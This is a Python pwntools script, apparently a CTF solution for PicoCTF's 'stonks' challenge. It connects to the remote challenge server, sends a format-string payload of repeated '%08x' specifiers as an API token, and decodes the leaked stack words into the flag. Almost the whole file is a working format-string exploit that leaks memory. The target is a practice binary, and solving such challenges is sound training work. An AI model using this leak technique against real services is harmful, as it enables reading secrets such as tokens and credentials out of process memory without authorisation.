#!/usr/bin/env python3

"""
Toast's submission for the PicoCTF challenge stonks.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
"""

from enum import Flag
from pwn import *

exe = ELF("./stonks")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    io = remote('mercury.picoctf.net', 16439)
    return io


def main():
    '''Return the flag.
    '''

    return get_flag()


def get_flag():
    '''Get the flag'''
    with conn() as io:
        io.recvline_endswith(b"portfolio")
        io.sendline(b'1')
        io.recvline_endswith(b"API token?")
        io.sendline(str.encode("|%08x" * 44))           # Arbitrary size
        data = io.recvline()    # Not the token
        data = io.recvline()    # Stack output

        # Extract only the flag portion
        data_list = data.split(b"|")
        coded_flag = b'|'.join(data_list[15:15+10])     # Flag on the stack

        coded_flag = coded_flag.split(b'|')
        flag = hex_to_ascii(coded_flag)
        log.success(flag)
        return flag


def hex_to_ascii(data: list):
    '''Converts list of bytes into ascii'''
    output = b''
    for val in data:
        try:
            int_val = int(val, 16)
            piece = p32(int_val, sign='unsigned', endian='little')
            output += piece
        except:
            pass

    output = output.decode('ascii', errors='ignore')
    return output


if __name__ == '__main__':
    main()
